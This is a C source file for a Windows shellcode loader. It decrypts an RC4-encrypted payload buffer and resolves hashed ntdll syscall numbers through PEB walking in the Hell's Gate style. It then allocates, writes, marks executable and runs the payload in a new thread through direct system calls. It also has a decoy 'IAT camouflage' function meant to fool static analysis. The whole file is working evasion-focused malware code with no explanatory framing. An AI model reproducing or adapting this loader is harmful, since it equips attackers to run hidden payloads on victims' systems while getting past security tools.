//includes
#include "encryption.h"
#include "utils.h"
#include "types.h"
#include "crt.h"


unsigned char buf[] =
"\x9c\x0c\x58\x89\xb1\x5f\x28\xe7\xa4\xd6\xb8\xaa\x95\x12"
"\xd1\x05\x0e\x44\x89\x23\x16\x1c\x2c\xab\xd2\x38\x8c\xd0"
"\xed\xe2\x9b\xe1\x48\x6a\x89\x9f\x4e\xd3\xe5\x71\x1d\x8f"
"\x00\x5e\xd5\xbd\x7b\xe6\x7d\xec\xa1\x16\x35\x19\xe2\xc3"
"\xf7\xbd\xad\x50\xe6\xd0\x63\xd1\x9a\xe2\xbb\xd8\x36\x59"
"\x35\xae\x19\x8a\xae\x05\x4f\xc4\x66\x43\x85\xd5\xa6\x84"
"\xf9\x2d\x89\xed\xa6\xa3\xf8\x10\x49\xfc\x3b\xee\xdf\x78"
"\xa9\x05\xda\x63\x67\x24\xeb\x4a\x8f\x7d\x21\xa0\x95\x7e"
"\xa9\xf3\x85\x3e\x71\xa6\xf2\x91\xaa\x13\xf1\xa8\x51\x59"
"\x1a\x48\x50\x1a\x64\x0b\xe1\x1f\x10\xe4\x52\x38\x9e\x0d"
"\x9e\xc6\xd1\xfa\x6b\x91\x0e\x8f\x3f\x82\x16\x84\x6d\x2f"
"\xd3\xd7\x34\x37\x16\xe6\xa1\x51\x5f\x47\xda\xba\x2d\xaf"
"\x80\xf2\x11\x10\x0d\xea\x6e\x58\x3d\xe5\x24\xd1\xab\xff"
"\x5f\x49\xd4\x2f\x07\x05\x9a\x3f\x04\xe9\xea\x3a\x7a\x56"
"\x5f\x8c\x4c\x3f\xcf\x79\xc1\x1b\x4d\xa6\x1b\xc2\x14\xe3"
"\x84\x6f\x9d\x3d\xea\x17\xbd\x56\xb4\x40\x56\x07\xbf\x96"
"\x4a\x5a\x74\x84\x3d\x7a\xa4\x98\x23\xb6\xb2\x03\x96\x51"
"\xcc\xab\xfd\x49\x91\x3b\x89\x03\x4e\x3c\x5f\x91\x48\x9f"
"\xdf\x62\x72\x65\x7a\xb4\x12\x22\x74\x18\xf9\xce\x7d\x7a"
"\x35\xb8\xb4\x0e\xcc\x8c\x49\xf2\x98\x3c";

// Declare the external assembly procedures
extern void FuncY(WORD wSystemCall);
extern FuncX();

//IAT camouflage
void IATCamouflage()
{
	unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
	i = GetLastError();
	i = SetCriticalSectionSpinCount(NULL, NULL);
	i = GetWindowContextHelpId(NULL);
	i = GetWindowLongPtrW(NULL, NULL);
	i = RegisterClassW(NULL);
	i = IsWindowVisible(NULL);
	i = ConvertDefaultLocale(NULL);
	i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
	i = IsDialogMessageW(NULL, NULL);
}

//main function
int main(int argc, char* argv[])
{
	int counter = 0;
	counter = (counter + 1) % 3;
	if (counter > 100)
	{
		IATCamouflage();
	}

	wchar_t TargetDLL[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
	//perform PEB walking
	PPEB pPeb = GetPEBAddress();
	PPEB_LDR_DATA pLdr = GetLdrAddress(pPeb);
	PLIST_ENTRY pHeadNode = GetModuleList(pLdr);
	DWORD_PTR pModuleAddr = GetModuleBaseAddr(TargetDLL, pHeadNode);
	PBYTE pBase = (PBYTE)pModuleAddr;

	//make sure base address is not NULL
	if (pBase == 0 || pBase == NULL)
	{
		EXITA(-1);
	}

	//find address of functions we need to detect if hooks are present
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;

	//error handling
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		EXITA(-1);
	}

	PIMAGE_NT_HEADERS pNtHeader = GetNTHeader(pBase, pDosHeader);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		EXITA(-1);
	}

	PIMAGE_EXPORT_DIRECTORY pImgExportDir = GetImgExportDir(pBase, pNtHeader);

	//populate VX_TABLE
	//initialize the hashes we need to check for, if found we save the SSN
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0x2ebf490a8b674900;
	Table.NtCreateThreadEx.dwHash = 0x9d5cb5995b416964;
	Table.NtWriteVirtualMemory.dwHash = 0xd4b85e855339e9c6;
	Table.NtProtectVirtualMemory.dwHash = 0x493685c9300901fc;
	Table.NtWaitForSingleObject.dwHash = 0xb54b0f43b27c4ef0;

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
	{
		EXITA(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
	{
		EXITA(-1);
	}

	//decode
	rc4(buf, sizeof(buf));

	//perform the systemcalls
	// Allocate memory for the shellcode
	NTSTATUS status = 0x00000000;
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(buf);
	FuncY(Table.NtAllocateVirtualMemory.wSystemCall);
	status = FuncX((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, buf, sizeof(buf));

	// Change page permissions
	ULONG ulOldProtect = 0;
	FuncY(Table.NtProtectVirtualMemory.wSystemCall);
	status = FuncX((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	FuncY(Table.NtCreateThreadEx.wSystemCall);
	status = FuncX(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	FuncY(Table.NtWaitForSingleObject.wSystemCall);
	status = FuncX(hHostThread, FALSE, &Timeout);

	return 0;
}